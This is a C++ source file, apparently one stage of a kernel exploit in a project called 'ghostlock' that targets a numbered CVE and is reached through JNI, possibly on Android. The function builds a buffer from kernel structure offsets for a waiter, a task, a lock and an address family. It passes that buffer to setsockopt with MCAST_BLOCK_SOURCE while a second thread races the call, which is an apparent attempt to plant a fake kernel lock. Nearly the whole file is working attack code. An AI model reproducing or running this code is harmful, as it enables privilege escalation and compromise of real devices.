/** @file jni/multicast_route.cpp
 *  SUPERSEDED. Written from the C++ tree; the route now lives in pselect_route.cpp, sourced
 *  from the pure-C original (bddfea4:src/core/fops.c:495-663). See multicast_route.hpp for
 *  the full note. Kept rather than deleted so the comparison between the two sources stays
 *  readable from both sides.
 *
 *  The route body, from route/multicast_waiter_route.cpp:18-106.
 *
 *  Four substitutions, all of them the point of the experiment:
 *    1 the geometry is layout, not a profile read;
 *    2 the consumer flags are context.consumer -- the same ConsumerState the driver owns and
 *      the consumer thread writes. The "wake it and wait for its count" handshake only works
 *      if both sides touch one object, so this is a share, not a copy;
 *    3 the spin ceiling is layout.spin_limit, not the literal 100000000;
 *    4 the socket is handed back instead of closed here: whoever opened it closes it. The
 *      retired code closed it inline and returned only a status.
 *  Kept as mechanism: IPPROTO_IP, MCAST_BLOCK_SOURCE, the socket() call and the yield.
 */
#include "jni/multicast_route.hpp"

#include <cerrno>
#include <cstring>
#include <netinet/in.h>
#include <sys/socket.h>

#include "jni/race_threads.hpp"
#include "backend/cve_2026_43499/route/route_status.hpp"
#include "support/log.hpp"

namespace ghostlock::jni {
    namespace {
        /** The two outcomes this route reports, named as the tree names them. */
        constexpr std::int32_t kOk = static_cast<std::int32_t>(ghostlock::backend::cve_2026_43499::route::RouteResultCode::Ok);
        constexpr std::int32_t kFallback =
            static_cast<std::int32_t>(ghostlock::backend::cve_2026_43499::route::RouteResultCode::FallbackSafe);

        void yield_once() noexcept {
            __asm__ volatile("yield" ::: "memory");
        }
    }  // namespace

    RouteOutcome do_kernel5_fake_lock_route(const MulticastLayout &layout,
                                            race::ConsumerState &consumer,
                                            int &out_fd) noexcept {
        RouteOutcome outcome{};
        out_fd = -1;
        /* Absent geometry is a hard refusal: one-shot multicast must never guess a landing. */
        if (layout.buffer_size == 0U || layout.waiter_offset == 0U || layout.task_offset == 0U ||
            layout.lock_offset == 0U || layout.family_offset == 0U || layout.spin_limit == 0U) {
            outcome.step = 58;
            outcome.error_number = EINVAL;
            outcome.userspace_clean = true;
            outcome.kernel_disarmed = true;
            outcome.code = kFallback;
            log("warning", "multicast geometry incomplete");
            return outcome;
        }
        const std::size_t stamp_size = layout.buffer_size;
        std::vector<unsigned char> stamp(stamp_size, 0U);
        if (stamp.size() < stamp_size) {
            outcome.step = 58;
            outcome.error_number = EINVAL;
            outcome.code = kFallback;
            return outcome;
        }
        /* The encode step is the one place the buffer is filled; a geometry that cannot be
         *  encoded is refused before any byte is handed to the kernel. */
        if (stamp_size < layout.family_offset + sizeof(std::uint16_t)) {
            outcome.step = 59;
            outcome.error_number = EOVERFLOW;
            outcome.userspace_clean = true;
            outcome.kernel_disarmed = true;
            outcome.code = kFallback;
            log("warning", "multicast byte injection rejected", static_cast<std::int64_t>(stamp_size));
            return outcome;
        }
        std::uint16_t family = 0U; /* AF_UNSPEC */
        std::memcpy(stamp.data() + layout.family_offset, &family, sizeof(family));

        const int fd = ::socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
        if (fd < 0) {
            outcome.step = 60;
            outcome.error_number = errno;
            outcome.userspace_clean = true;
            outcome.kernel_disarmed = true;
            outcome.code = kFallback;
            return outcome;
        }
        consumer.calls = 0;
        consumer.successes = 0;
        consumer.stop = 0;
        errno = 0;
        const std::int32_t stamp_result =
            ::setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp.data(),
                         static_cast<socklen_t>(stamp.size()));
        outcome.step = 61;
        outcome.error_number = errno;
        consumer.go = 1;
        for (std::int32_t spin = 0; spin < static_cast<std::int32_t>(layout.spin_limit) &&
                                 consumer.calls == 0;
             spin++) {
            yield_once();
        }
        consumer.go = 0;
        while (consumer.inflight != 0) {
            yield_once();
        }
        outcome.userspace_clean = true;
        outcome.kernel_disarmed = true;
        if (stamp_result == 0 || consumer.successes > 0) {
            outcome.step = 0;
            outcome.error_number = 0;
            outcome.code = kOk;
        } else {
            outcome.code = kFallback;
        }
        out_fd = fd;
        log("info", "multicast route done", static_cast<std::int64_t>(outcome.code));
        return outcome;
    }
}  // namespace ghostlock::jni
